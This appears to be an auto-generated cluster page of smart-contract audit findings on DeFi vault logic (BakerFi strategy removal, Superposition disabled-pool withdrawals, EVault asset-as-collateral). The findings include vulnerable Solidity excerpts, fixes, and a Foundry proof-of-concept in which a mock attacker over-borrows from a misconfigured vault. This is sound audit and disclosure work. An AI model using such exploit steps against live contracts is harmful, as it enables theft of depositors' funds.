# Cluster -1438

**Rank:** #385  
**Count:** 14  

## Label
Insufficient collateral validation and improper asset allocation lead to unauthorized withdrawals, yield extraction, and illiquidity, enabling attackers to drain funds or manipulate share values through flawed access controls and logic.

## Cluster Information
- **Total Findings:** 14

## Examples

### Example 1

**Auto Label:** Insufficient collateral validation and improper asset allocation lead to unauthorized withdrawals, yield extraction, and illiquidity, enabling attackers to drain funds or manipulate share values through flawed access controls and logic.  

**Original Text Preview:**

<https://github.com/code-423n4/2024-12-bakerfi/blob/main/contracts/core/MultiStrategy.sol# L265>

### Finding description and impact

A leverage strategy with deployed assets can not be removed from `MultiStrategyVault` due to insufficient assets

### Proof of Concept

`MultiStrategyVault` is used to manage multiple investment strategies. The vault manager can remove an existing strategy by calling `MultiStrategy# removeStrategy()`:
```

    function removeStrategy(uint256 index) external onlyRole(VAULT_MANAGER_ROLE) {
        // Validate the index to ensure it is within bounds
        if (index >= _strategies.length) revert InvalidStrategyIndex(index);

        // Retrieve the total assets managed by the strategy to be removed
        uint256 strategyAssets = _strategies[index].totalAssets();

        // Update the total weight and mark the weight of the removed strategy as zero
        _totalWeight -= _weights[index];
        _weights[index] = 0;

        // If the strategy has assets, undeploy them and allocate accordingly
        if (strategyAssets > 0) {
@>          IStrategy(_strategies[index]).undeploy(strategyAssets);
@>          _allocateAssets(strategyAssets);
        }

        // Move the last strategy to the index of the removed strategy to maintain array integrity
        uint256 lastIndex = _strategies.length - 1;
        if (index < lastIndex) {
            _strategies[index] = _strategies[lastIndex];
            _weights[index] = _weights[lastIndex];
        }

        emit RemoveStrategy(address(_strategies[lastIndex]));
        // Remove the last strategy and weight from the arrays
        _strategies.pop();
        _weights.pop();
    }
```

If the strategy to be removed has deployed assets, it will be undeployed first and then allocated to other strategies. It is expected that the equivalent amount of assets will be received when calling `IStrategy.undeploy()`:
```

          IStrategy(_strategies[index]).undeploy(strategyAssets);
          _allocateAssets(strategyAssets);
```

**However, the amount of received assets could be less than `strategyAssets` if the strategy is a leverage strategy**.

When a leverage strategy is used to undeploy assets:

1. `deltaDebt` of debt token will be borrowed from `flashLender`
2. Then the borrowed debt token is repaid to the lending protocol to withdraw `deltaCollateralAmount` of collateral
3. The withdrawn collateral is swapped to debt token
4. A certain number (`deltaDebt + fee`) of debt token will be paid to `flashLender`

   
```

   function _undeploy(uint256 amount, address receiver) private returns (uint256 receivedAmount) {
       // Get price options from settings
       IOracle.PriceOptions memory options = IOracle.PriceOptions({
           maxAge: getPriceMaxAge(),
           maxConf: getPriceMaxConf()
       });

       // Fetch collateral and debt balances
       (uint256 totalCollateralBalance, uint256 totalDebtBalance) = getBalances();
       uint256 totalCollateralInDebt = _toDebt(options, totalCollateralBalance, false);

       // Ensure the position is not in liquidation state
       if (totalCollateralInDebt <= totalDebtBalance) revert NoCollateralMarginToScale();

       // Calculate percentage to burn to accommodate the withdrawal
       uint256 percentageToBurn = (amount * PERCENTAGE_PRECISION) / (totalCollateralInDebt - totalDebtBalance);

       // Calculate delta position (collateral and debt)
       (uint256 deltaCollateralInDebt, uint256 deltaDebt) = _calcDeltaPosition(
           percentageToBurn,
           totalCollateralInDebt,
           totalDebtBalance
       );
       // Convert deltaCollateralInDebt to deltaCollateralAmount
       uint256 deltaCollateralAmount = _toCollateral(options, deltaCollateralInDebt, true);

       // Calculate flash loan fee
       uint256 fee = flashLender().flashFee(_debtToken, deltaDebt);

       // Approve the flash lender to spend the debt amount plus fee
       if (!IERC20Upgradeable(_debtToken).approve(flashLenderA(), deltaDebt + fee)) {
           revert FailedToApproveAllowance();
       }

       // Prepare data for flash loan execution
       bytes memory data = abi.encode(deltaCollateralAmount, receiver, FlashLoanAction.PAY_DEBT_WITHDRAW);
       _flashLoanArgsHash = keccak256(abi.encodePacked(address(this), _debtToken, deltaDebt, data));

       // Execute flash loan
       if (!flashLender().flashLoan(IERC3156FlashBorrowerUpgradeable(this), _debtToken, deltaDebt, data)) {
           _flashLoanArgsHash = 0;
           revert FailedToRunFlashLoan();
       }
       // The amount of Withdrawn minus the repay ampunt
       emit StrategyUndeploy(msg.sender, deltaCollateralInDebt - deltaDebt);

       // Reset hash after successful flash loan
       _flashLoanArgsHash = 0;

       // Update deployed assets after withdrawal
       receivedAmount = _pendingAmount;
       uint256 undeployedAmount = deltaCollateralInDebt - deltaDebt;
       _deployedAssets = _deployedAssets > undeployedAmount ? _deployedAssets - undeployedAmount : 0;

       // Emit strategy update and reset pending amount
       emit StrategyAmountUpdate(_deployedAssets);
       // Pending amount is not cleared to save gas
       //_pendingAmount = 0;
   }
   
```

   The amount of received assets can be calculated as below:

*Note: please see scenario in warden’s [original submission](https://code4rena.com/evaluate/2024-12-bakerfi-invitational/findings/F-5).*

### Recommended mitigation steps

When removing a strategy from `MultiStrategyVault`, ensure the amount of assets to be re-allocated is same as the received amount:
```

    function removeStrategy(uint256 index) external onlyRole(VAULT_MANAGER_ROLE) {
        // Validate the index to ensure it is within bounds
        if (index >= _strategies.length) revert InvalidStrategyIndex(index);

        // Retrieve the total assets managed by the strategy to be removed
        uint256 strategyAssets = _strategies[index].totalAssets();

        // Update the total weight and mark the weight of the removed strategy as zero
        _totalWeight -= _weights[index];
        _weights[index] = 0;

        // If the strategy has assets, undeploy them and allocate accordingly
        if (strategyAssets > 0) {
-           IStrategy(_strategies[index]).undeploy(strategyAssets);
-           _allocateAssets(strategyAssets);
+           _allocateAssets(IStrategy(_strategies[index]).undeploy(strategyAssets));
        }

        // Move the last strategy to the index of the removed strategy to maintain array integrity
        uint256 lastIndex = _strategies.length - 1;
        if (index < lastIndex) {
            _strategies[index] = _strategies[lastIndex];
            _weights[index] = _weights[lastIndex];
        }

        emit RemoveStrategy(address(_strategies[lastIndex]));
        // Remove the last strategy and weight from the arrays
        _strategies.pop();
        _weights.pop();
    }
```

**chefkenji (BakerFi) confirmed**

**[BakerFi mitigated](https://github.com/code-423n4/2025-01-bakerfi-mitigation?tab=readme-ov-file# findings-being-mitigated):**

> [PR-16](https://github.com/baker-fi/bakerfi-contracts/pull/16)

**Status:** Mitigation confirmed. Full details in reports from [0xlemon](https://code4rena.com/evaluate/2025-01-bakerfi-mitigation-review/findings/S-32) and [shaflow2](https://code4rena.com/evaluate/2025-01-bakerfi-mitigation-review/findings/S-9).

---

---
### Example 2

**Auto Label:** Insufficient state validation and flawed access control allow unauthorized full liquidity extraction during active periods, enabling attackers to drain funds through bypassed balance and period checks.  

**Original Text Preview:**

There is a functionality for disabling a pool in case of unforeseen circumstances or if a problem occurs. While the pool is disabled the users should not be able to do certain actions but removing their liquidity should not be one of them.

When a problem occurs in the pool, users should be able to remove their liquidity, as it may be at risk and they may lose their money. The problem is there is a check that does not allow them to do it.

### Proof of Concept

`update_position_internal` has a [comment](https://github.com/code-423n4/2024-08-superposition/blob/4528c9d2dbe1550d2660dac903a8246076044905/pkg/seawater/src/lib.rs#L687C25-L687C83) that states "Requires the pool to be enabled unless removing liquidity.", meaning that there should be a check for the pool status only when liquidity is added and the users should be allowed to remove their liquidity if the pool is not active.

But `update_position_internal` calls `update_position` that is used to add or remove liquidity from a position and the function has this check:

```js
        assert_or!(self.enabled.get(), Error::PoolDisabled);
```

The check above prevents the function from being called when the pool is disabled, which is understandable in case users want to add liquidity to the pool when there is a problem.

However, users don't want their money to be at risk and they would want to remove their funds but they can't because of that check.

### Recommended Mitigation Steps

If the passed `delta` is negative, it means the user is removing liquidity, so check the pool's status only when the `delta` is positive.

### Assessed type

Access Control

**[af-afk (Superposition) confirmed](https://github.com/code-423n4/2024-08-superposition-findings/issues/31#event-14300539250)** 

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-08-superposition-findings/issues/31#issuecomment-2369648185):**
 > The submission and its duplicates have correctly identified that liquidity withdrawals are disallowed when the pool is paused despite what the code's documentation indicates.
> 
> I believe a medium-risk severity rating is appropriate given that important functionality of the protocol is inaccessible in an emergency scenario when it should be accessible.

***

---
### Example 3

**Auto Label:** Insufficient collateral validation and improper asset allocation lead to unauthorized withdrawals, yield extraction, and illiquidity, enabling attackers to drain funds or manipulate share values through flawed access controls and logic.  

**Original Text Preview:**

## Asset as Collateral Issue Report

## Context
*(No context files were provided by the reviewer)*

## Description
If a governor were to accidentally set the asset of an EVault as collateral, this allows anyone to borrow outsized amounts of assets.

### Example
- **eeUSDC** vault is created. **eUSDC** is the asset. Vault contains **1,000,000 eUSDC**.
- Governor accidentally calls `setLTV` with eUSDC as a valid collateral with an LTV of **0.98**.
- Say the attacker has **10,000 eUSDC**.
- They can now borrow **487,000 eUSDC** since: 
  ```
  10,000 + 487,000 * 0.98 = 487,060 > 487,000
  ```
- If they had even more capital, they could borrow every token in the vault preventing:
  - More borrows.
  - Withdrawal/redeem of eUSDC shares.

The maximum amount they can borrow for an initial amount *a* is:

```
a * (v / (1 - v))
```

The term `v / (1 - v)` is the multiplier. Here is the multiplier for various LTVs:

| LTV  | Multiplier |
|------|------------|
| 0.90 | 10         |
| 0.95 | 20         |
| 0.98 | 50         |
| 0.99 | 100        |

Also, since the price of eUSDC vs eUSDC will always be **1.00**, this loan cannot be liquidated until sufficient interest has been accrued. However, given the size of the loan, this will happen fairly quickly.

If the governor makes this mistake, it is also relatively easily fixed by:
- Setting the LTV to zero.
- In a batch:
  - Liquidating the attacker's position.
  - Paying back the debt with seized collateral (since they are the same token).

## Impact
Since making this mistake is relatively unlikely and given that it is easily fixed by the governor, this is clearly a **Low Severity** finding. However, given how easy it is to remove this foot-gun, we have submitted it anyway.

## Recommendation
An extra check should be added to `Governance#setLTV` to prevent the asset from being set as a valid collateral.

```solidity
function setLTV(address collateral, uint16 borrowLTV, uint16 liquidationLTV, uint32 rampDuration) 
public 
virtual 
nonReentrant 
governorOnly 
{
    (IERC20 asset,,) = ProxyUtils.metadata();
    // self-collateralization and asset as collateral are not allowed
    if (collateral == address(this) || collateral == address(asset)) revert E_InvalidLTVAsset();
    // ...
}
```

## Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DeployPermit2} from "permit2/test/utils/DeployPermit2.sol";
import {EthereumVaultConnector} from "ethereum-vault-connector/EthereumVaultConnector.sol";
import {IEVC} from "ethereum-vault-connector/interfaces/IEthereumVaultConnector.sol";
import {IVault} from "ethereum-vault-connector/interfaces/IVault.sol";
import {GenericFactory} from "../../src/GenericFactory/GenericFactory.sol";
import {EVault} from "../../src/EVault/EVault.sol";
import {ProtocolConfig} from "../../src/ProtocolConfig/ProtocolConfig.sol";
import {SequenceRegistry} from "../../src/SequenceRegistry/SequenceRegistry.sol";
import {Dispatch} from "../../src/EVault/Dispatch.sol";
import {Initialize} from "../../src/EVault/modules/Initialize.sol";
import {Token} from "../../src/EVault/modules/Token.sol";
import {Vault} from "../../src/EVault/modules/Vault.sol";
import {Borrowing} from "../../src/EVault/modules/Borrowing.sol";
import {Liquidation} from "../../src/EVault/modules/Liquidation.sol";
import {BalanceForwarder} from "../../src/EVault/modules/BalanceForwarder.sol";
import {Governance} from "../../src/EVault/modules/Governance.sol";
import {RiskManager} from "../../src/EVault/modules/RiskManager.sol";
import {IEVault, IERC20} from "../../src/EVault/IEVault.sol";
import {IPriceOracle} from "../../src/interfaces/IPriceOracle.sol";
import {Base} from "../../src/EVault/shared/Base.sol";
import {Errors} from "../../src/EVault/shared/Errors.sol";
import {TestERC20} from "../../test/mocks/TestERC20.sol";
import {MockBalanceTracker} from "../../test/mocks/MockBalanceTracker.sol";
import {IRMTestDefault} from "../../test/mocks/IRMTestDefault.sol";
import {Pretty} from "../../test/invariants/utils/Pretty.sol";

contract AssetAsCollateralBorrowTest is Test, DeployPermit2 {
    using Pretty for uint256;
    using Pretty for int256;
    using Pretty for uint16;

    address admin;
    address feeReceiver;
    address protocolFeeReceiver;
    ProtocolConfig protocolConfig;
    MockPriceOracle oracle;
    MockBalanceTracker balanceTracker;
    address permit2;
    address sequenceRegistry;
    GenericFactory public factory;
    EthereumVaultConnector public evc;
    Base.Integrations integrations;
    Dispatch.DeployedModules modules;
    address initializeModule;
    address tokenModule;
    address vaultModule;
    address borrowingModule;
    address liquidationModule;
    address riskManagerModule;
    address balanceForwarderModule;
    address governanceModule;
    EVault public coreProductLine;
    EVault public escrowProductLine;
    TestERC20 USDC;
    IEVault public eUSDC;
    IEVault public eeUSDC;

    /* Constants for the PoC */
    uint256 INIT_ATTACKER = 10_000e18;
    uint256 INIT_LIQUIDATOR = 1_000e18;
    uint256 INIT_VAULT_USDC_BAL = 1e6 * 1e18;
    uint256 USDC_MINT_AMOUNT = INIT_VAULT_USDC_BAL + INIT_ATTACKER + INIT_LIQUIDATOR;
    uint16 LTV = 0.98e4;

    function setUp() public virtual {
        admin = vm.addr(1000);
        feeReceiver = makeAddr("feeReceiver");
        protocolFeeReceiver = makeAddr("protocolFeeReceiver");
        factory = new GenericFactory(admin);
        evc = new EthereumVaultConnector();
        protocolConfig = new ProtocolConfig(admin, protocolFeeReceiver);
        balanceTracker = new MockBalanceTracker();
        oracle = new MockPriceOracle();
        permit2 = deployPermit2();
        sequenceRegistry = address(new SequenceRegistry());
        integrations = Base.Integrations(address(evc), address(protocolConfig), sequenceRegistry,
        address(balanceTracker), permit2);
        initializeModule = address(new Initialize(integrations));
        tokenModule = address(new Token(integrations));
        vaultModule = address(new Vault(integrations));
        borrowingModule = address(new Borrowing(integrations));
        liquidationModule = address(new Liquidation(integrations));
        riskManagerModule = address(new RiskManager(integrations));
        balanceForwarderModule = address(new BalanceForwarder(integrations));
        governanceModule = address(new Governance(integrations));
        modules = Dispatch.DeployedModules({
            initialize: initializeModule,
            token: tokenModule,
            vault: vaultModule,
            borrowing: borrowingModule,
            liquidation: liquidationModule,
            riskManager: riskManagerModule,
            balanceForwarder: balanceForwarderModule,
            governance: governanceModule
        });
        EVault evaultImpl = new EVault(integrations, modules);
        vm.prank(admin); factory.setImplementation(address(evaultImpl));
        USDC = new TestERC20("Fake USDC", "USDC", 18, false);
        vm.label(address(USDC), "Fake USDC");
        address unitOfAccount = address(USDC);
        eUSDC = IEVault(
            factory.createProxy(address(0), true, abi.encodePacked(address(USDC), address(oracle),
            unitOfAccount))
        );
        eUSDC.setInterestRateModel(address(new IRMTestDefault()));
        eeUSDC = IEVault(
            factory.createProxy(address(0), true, abi.encodePacked(address(eUSDC), address(oracle),
            unitOfAccount))
        );
        eeUSDC.setInterestRateModel(address(new IRMTestDefault()));
        vm.label(address(eUSDC), "eUSDC");
        vm.label(address(eeUSDC), "eeUSDC");
    }

    function test_AssetAsCollateralBorrow() public {
        address attacker = makeAddr("attacker");
        address liquidator = makeAddr("liquidator");
        uint160 prefix = uint160(attacker) & ~uint160(0xff);
        
        // Set initial prices
        oracle.setPrice(address(eUSDC), address(USDC), 1e18);
        oracle.setPrice(address(eeUSDC), address(USDC), 1e18);
        USDC.approve(address(eUSDC), type(uint256).max);
        eUSDC.approve(address(eeUSDC), type(uint256).max);
        USDC.mint(address(this), USDC_MINT_AMOUNT);
        eUSDC.deposit(INIT_VAULT_USDC_BAL, address(this));
        eUSDC.deposit(INIT_ATTACKER, attacker);
        eUSDC.deposit(INIT_LIQUIDATOR, liquidator);
        eeUSDC.deposit(INIT_VAULT_USDC_BAL, address(this));

        // Set LTVs
        // eeUSDC accepts eUSDC as collateral. Weird.
        eeUSDC.setLTV(address(eUSDC), LTV, LTV, 0);
        
        // Setup Token transfer allowances for attacker
        vm.startPrank(attacker);
        USDC.approve(address(eUSDC), type(uint256).max);
        eUSDC.approve(address(eeUSDC), type(uint256).max);
        vm.stopPrank();
        
        // Enable controllers and collateral
        vm.startPrank(attacker);
        evc.enableController(attacker, address(eeUSDC));
        evc.enableCollateral(attacker, address(eUSDC));
        vm.stopPrank();

        vm.startPrank(attacker);
        console.log("--- Balances before borrow ---");
        logAccountBalances("this", address(this));
        logAccountBalances("attacker", attacker);
        uint256 amt = eUSDC.balanceOf(attacker);
        
        if (LTV < 1e4) {
            uint256 borrowAmt = amt * LTV / (1e4 - LTV + 1) / 4;
            eeUSDC.borrow(borrowAmt, attacker);
        } else {
            eeUSDC.borrow(INIT_VAULT_USDC_BAL, attacker);
        }
        
        console.log("--- Balances after borrow ---");
        logAccountBalances("attacker", attacker);
        vm.stopPrank();
        
        console.log("--- Governor notices mistake and fixes it ---");
        eeUSDC.setLTV(address(eUSDC), 0, 0, 0);
        logAccountBalances("attacker (after LTV set to zero)", attacker);
        (uint256 maxRepay, uint256 maxYield) = eeUSDC.checkLiquidation(liquidator, attacker, address(eUSDC));
        console.log("liquidation params: maxRepay = %s , maxYield = %s", maxRepay.pretty(), maxYield.pretty());
        
        vm.startPrank(liquidator);
        eUSDC.approve(address(eeUSDC), type(uint256).max);
        evc.enableController(liquidator, address(eeUSDC));
        console.log("Attempt liquidation");
        
        IEVC.BatchItem[] memory items = new IEVC.BatchItem[](2);
        items[0] = IEVC.BatchItem({
            onBehalfOfAccount: liquidator,
            targetContract: address(eeUSDC),
            value: 0,
            data: abi.encodeCall(eeUSDC.liquidate, (attacker, address(eUSDC), type(uint256).max, 0))
        });
        items[1] = IEVC.BatchItem({
            onBehalfOfAccount: liquidator,
            targetContract: address(eeUSDC),
            value: 0,
            data: abi.encodeCall(eeUSDC.repay, (type(uint256).max, liquidator))
        });
        evc.batch(items);
        
        logAccountBalances("attacker", attacker);
        logAccountBalances("liquidator", liquidator);
        vm.stopPrank();
    }

    function logAccountBalances(string memory s, address account) internal {
        uint256 collateralValue;
        uint256 liabilityValue;
        console.log("%s {", s);
        console.log(" USDC: %s", USDC.balanceOf(account).pretty());
        console.log(" eUSDC: %s", eUSDC.balanceOf(account).pretty());
        console.log(" eeUSDC: %s", eeUSDC.balanceOf(account).pretty());
        
        address[] memory cs = evc.getControllers(account);
        if (cs.length > 0 && cs[0] == address(eeUSDC)) {
            (collateralValue, liabilityValue) = eeUSDC.accountLiquidity(account, false);
            console.log(" eeUSDC {");
            console.log(" collateral value: %s", collateralValue.pretty());
            console.log(" liability: %s", liabilityValue.pretty());
            console.log(" }");
        }
        console.log("}");
    }
}

contract MockPriceOracle {
    mapping(address base => mapping(address quote => uint256)) price;

    function name() external pure returns (string memory) {
        return "MockPriceOracle";
    }

    function getQuote(uint256 amount, address base, address quote) public view returns (uint256 out) {
        return amount * price[base][quote] / 1e18;
    }

    function getQuotes(uint256 amount, address base, address quote)
    external
    view
    returns (uint256 bidOut, uint256 askOut)
    {
        bidOut = askOut = getQuote(amount, base, quote);
    }

    ///// Mock functions
    function setPrice(address base, address quote, uint256 newPrice) external {
        price[base][quote] = newPrice;
    }
}
```

---
